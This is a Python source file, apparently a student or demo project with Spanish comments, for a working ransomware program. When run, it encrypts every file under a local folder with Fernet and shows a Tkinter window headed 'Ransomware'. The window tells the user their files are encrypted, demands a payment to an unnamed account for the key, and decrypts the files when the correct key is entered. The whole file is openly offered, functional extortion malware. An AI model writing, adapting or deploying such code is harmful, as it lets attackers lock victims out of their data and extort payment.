from cryptography.fernet import Fernet
from tkinter import *
from tkinter import ttk
import os
import glob
from encrypt import generate_key, encrypt_files


# ************************ DESENCRIPTACION ******************************


def decrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)

        with open(item, 'wb') as file_write:
            file_write.write(decrypted_data)


def decrypt_files(input_key):
    # Esta validación quizás se debería hacer con una request
    # key = load_key()
    # print(key.decode('UTF-8'))
    
    if key != input_key.encode('utf-8'):
        return False
    
    path_to_encrypt = './files'
    os.remove(path_to_encrypt + '/' + 'README.txt')

    #items = os.listdir(path_to_encrypt)
    #full_path = [path_to_encrypt + '/' + item for item in items]
    full_path = glob.glob(path_to_encrypt+"/**", recursive=True)
    full_path = [f for f in full_path if os.path.isfile(f)] # Saco las carpetas de la lista

    decrypt(full_path, input_key.encode('utf-8'))
    return True





# ************************ PANTALLA ******************************

def verify_key():
  input = entry.get()
  ret = decrypt_files(input)
  
  if ret: 
    label4.config(text = 'Se desencriptaron los archivos')
  else:
    label4.config(text = 'Clave incorrecta')
  
  
  
  
if __name__ == '__main__':
  key = generate_key() 
  encrypt_files(key)
  
  win = Tk()
  win.geometry("450x300")
  win.title("Ransomware")
  
  
  label1=Label(win, text="Sus archivos fueron encriptados", font=("Courier 14 bold")).pack(pady=10)
  label2=Label(win, text="Transfiera a la cuenta ... para obtener \nla clave para desencriptarlos", font=("Courier 12 bold")).pack(pady=5)
  label3=Label(win, text="Ingrese la clave", font=("Courier 14 bold")).pack(pady=5)
  
  # Input del usuario
  entry= Entry(win, width= 60)
  entry.focus_set()
  entry.pack(padx = 10, pady=10)
  
   
  ttk.Button(win, text="Aceptar",width=20, command=verify_key).pack(pady=20)
  
  label4=Label(win, text="", font=("Courier 14 bold"))
  label4.pack(pady=5)
  
  win.mainloop()  
  
  
